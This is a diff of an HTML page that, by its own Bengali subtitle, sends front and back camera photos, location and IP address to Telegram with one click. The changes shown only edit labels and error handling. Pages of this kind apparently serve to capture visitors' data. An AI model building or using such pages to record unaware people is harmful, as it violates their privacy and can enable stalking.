@@ -105,8 +105,8 @@
 </head>
 <body>
 
-  <h1>Dual Camera + Location Capture</h1>
-  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ছবি + লোকেশন + IP Telegram-এ চলে যাবে</p>
+  <h1>Dual Camera + Location</h1>
+  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ছবি + লোকেশন + IP Telegram-এ পাঠানো হবে</p>
 
   <div class="premium-card">
     <button id="captureBtn" onclick="captureAll()">
@@ -165,7 +165,7 @@
           timestamp: new Date().toISOString()
         });
 
-        status.textContent = "All sent successfully ✓ (photos + location)";
+        status.textContent = "All sent successfully ✓ (photos + location + IP)";
       } catch (err) {
         status.textContent = "Error: " + (err.message || "Unknown");
         console.error(err);
@@ -196,7 +196,10 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
-      if (!res.ok) throw new Error("Send failed");
+      if (!res.ok) {
+        const errText = await res.text();
+        throw new Error(errText || "Send failed");
+      }
     }
   </script>
 </body>
